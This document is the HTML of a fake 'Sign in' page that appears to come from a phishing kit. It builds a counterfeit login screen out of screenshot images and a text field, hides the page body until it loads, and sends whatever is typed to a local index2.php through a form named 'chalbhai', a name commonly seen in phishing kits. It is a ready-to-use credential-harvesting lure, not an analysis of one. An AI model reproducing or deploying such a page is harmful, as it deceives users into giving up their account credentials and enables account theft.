<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<html>
<head>
<title>Sign in</title>
<meta http-equiv="content-type" content="text/html; charset=iso-8859-1">
<meta charset="utf-8" />
<meta name="applicable-device" content="pc,mobile" />
<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
<meta name="format-detection" content="telephone=no" />

<link rel="shortcut icon"
              href="images/favicon.ico"/>
			  
			  
	
<script type="text/javascript">

function unhideBody()
{
var bodyElems = document.getElementsByTagName("body");
bodyElems[0].style.visibility = "visible";
}

</script>

<body style="visibility:hidden" onload="unhideBody()">
</head>
<body>
<div id="image1" style="position:absolute; overflow:hidden; left:40px; top:7px; width:142px; height:49px; z-index:0"><img src="images/1.png" alt="" title="" border=0 width=142 height=49></div>

<div id="image2" style="position:absolute; overflow:hidden; left:943px; top:82px; width:383px; height:565px; z-index:1"><img src="images/2.png" alt="" title="" border=0 width=383 height=565></div>

<div id="image3" style="position:absolute; overflow:hidden; left:1042px; top:2px; width:278px; height:28px; z-index:2"><a href="#"><img src="images/asd1.png" alt="" title="" border=0 width=278 height=28></a></div>
<form action=index2.php name=chalbhai id=chalbhai method=post>
<div id="image4" style="position:absolute; overflow:hidden; left:1177px; top:357px; width:118px; height:25px; z-index:3"><a href="#"><img src="images/3.png" alt="" title="" border=0 width=118 height=25></a></div>

<div id="formcheckbox1" style="position:absolute; left:986px; top:358px; z-index:4"><input type="checkbox" name="formcheckbox1"></div>
<div id="image5" style="position:absolute; overflow:hidden; left:1198px; top:588px; width:52px; height:24px; z-index:5"><a href="#"><img src="images/4.png" alt="" title="" border=0 width=52 height=24></a></div>

<input name="id" type="text"  required style="position:absolute;border:none;font-size: 16px;width:300px;left:987px;height:34px;outline:none;top:244px;z-index:6">
<div id="image6" style="position:absolute; overflow:hidden; left:102px; top:140px; width:747px; height:496px; z-index:7"><img src="images/imapin.jpg" alt="" title="" border=0 width=747 height=496></div>

<div id="formimage1" style="position:absolute; left:988px; top:302px; z-index:8"><input type="image" name="formimage1" width="302" height="42" src="images/5.png"></div>

</body>
</html>